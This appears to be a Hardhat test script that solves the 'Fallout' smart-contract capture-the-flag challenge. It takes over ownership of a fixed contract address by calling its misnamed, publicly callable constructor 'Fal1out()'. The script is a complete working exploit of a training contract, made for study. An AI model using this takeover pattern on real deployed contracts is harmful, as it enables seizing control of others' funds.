import { ethers } from "hardhat";
import { expect } from "chai";

describe("fallout", function() {
    it("Should solve fallout challenge", async function(){ 
        this.timeout(0);

        // setup check wallet account 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0);

        // define target abi's necessary parts
        const targetABI = [
            "function Fal1out() public payable",
            "function owner() public view returns (address)",
        ]
        const targetAddr = "0xD85aFbb7393D0FA1Bb7A2b8462aD6A5AebB466c7";

        let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        let target = contract.connect(eoa);

        let owner = await target.owner();
        console.log(owner);

        // call constructor again 
        let tx = await target.Fal1out();
        await tx.wait();
        console.log(tx);

        owner = await target.owner();
        console.log(owner);
    });
});